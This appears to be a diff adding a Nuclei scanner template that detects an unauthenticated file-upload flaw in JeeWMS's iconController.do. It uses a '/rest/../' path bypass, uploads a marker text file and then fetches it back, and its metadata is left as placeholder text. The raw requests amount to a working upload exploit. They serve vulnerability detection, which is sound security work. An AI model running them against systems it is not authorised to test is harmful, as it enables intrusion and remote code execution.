@@ -1,0 +1,37 @@
+id: JeeWMS-iconControlle-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: JeeWMS iconController.do 文件上传致RCE漏洞
+  reference:
+    - https://
+  tags: tags
+variables:
+  filename: "{{rand_base(6)}}"
+http:
+  - raw:
+      - |+
+        POST /rest/../iconController.do?saveOrUpdateIcon HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHRhkXyQjTSAk8j8c
+        Content-Length: 490
+
+        ------WebKitFormBoundaryHRhkXyQjTSAk8j8c
+        Content-Disposition: form-data; name="name"; filename="{{filename}}.txt"
+        Content-Type: image/png
+
+        whoisceshi
+        ------WebKitFormBoundaryHRhkXyQjTSAk8j8c--
+
+      - |+
+        GET /plug-in/accordion/images/{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0 M2Sec/1.0
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - whoisceshi
